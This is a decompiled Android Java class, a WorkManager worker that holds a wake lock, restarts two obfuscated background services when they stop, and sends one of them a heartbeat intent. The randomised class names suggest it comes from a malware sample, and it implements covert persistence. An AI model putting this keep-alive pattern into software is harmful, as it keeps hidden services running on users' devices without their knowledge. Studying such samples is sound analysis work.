/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  android.content.Intent
 *  android.os.Build$VERSION
 *  android.os.PowerManager
 *  android.os.PowerManager$WakeLock
 *  android.util.Log
 */
package linker.resourcer.encoder;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;
import androidx.work.ListenableWorker;
import androidx.work.Worker;
import androidx.work.WorkerParameters;
import linker.resourcer.encoder.lqvpqwmhpvnnlhskxyjdwphzvsl;
import linker.resourcer.encoder.qswemlflptdlumxqnjrlg;
import linker.resourcer.encoder.tqvrhaaccrutxfxdqsvweshxhwtl;

public class Backworker
extends Worker {
    private PowerManager.WakeLock wakeLock;

    public Backworker(Context context, WorkerParameters workerParameters) {
        super(context, workerParameters);
    }

    private void acquireWakeLock() {
        PowerManager powerManager = (PowerManager)this.getApplicationContext().getSystemService("power");
        if (powerManager != null) {
            this.wakeLock = powerManager.newWakeLock(0x20000001, this.getApplicationContext().getPackageName() + ":wrk");
            this.wakeLock.acquire(60000L);
        }
    }

    private void releaseWakeLock() {
        if (this.wakeLock != null && this.wakeLock.isHeld()) {
            this.wakeLock.release();
        }
    }

    /*
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    @Override
    public ListenableWorker.Result doWork() {
        try {
            Object object;
            block14: {
                Intent intent;
                block13: {
                    if (this.isStopped()) {
                        ListenableWorker.Result result2 = ListenableWorker.Result.failure();
                        return result2;
                    }
                    this.acquireWakeLock();
                    object = this.getApplicationContext();
                    try {
                        intent = new Intent(this.getApplicationContext(), qswemlflptdlumxqnjrlg.class);
                        if (!tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(this.getApplicationContext(), qswemlflptdlumxqnjrlg.class)) {
                            if (Build.VERSION.SDK_INT >= 26) {
                                object.startForegroundService(intent);
                            } else {
                                object.startService(intent);
                            }
                        }
                        if (tqvrhaaccrutxfxdqsvweshxhwtl.isServiceRunning(this.getApplicationContext(), lqvpqwmhpvnnlhskxyjdwphzvsl.class)) break block13;
                        intent = new Intent(this.getApplicationContext(), lqvpqwmhpvnnlhskxyjdwphzvsl.class);
                        if (Build.VERSION.SDK_INT >= 26) {
                            object.startForegroundService(intent);
                            break block14;
                        }
                        object.startService(intent);
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                    break block14;
                }
                try {
                    intent = new Intent(this.getApplicationContext(), lqvpqwmhpvnnlhskxyjdwphzvsl.class);
                    intent.setAction("HB");
                    object.startService(intent);
                }
                catch (Exception exception) {}
            }
            object = ListenableWorker.Result.success();
            return object;
        }
        finally {
            this.releaseWakeLock();
        }
    }

    @Override
    public void onStopped() {
        super.onStopped();
        Log.w((String)"MyWorker", (String)"Worker was stopped!");
    }
}

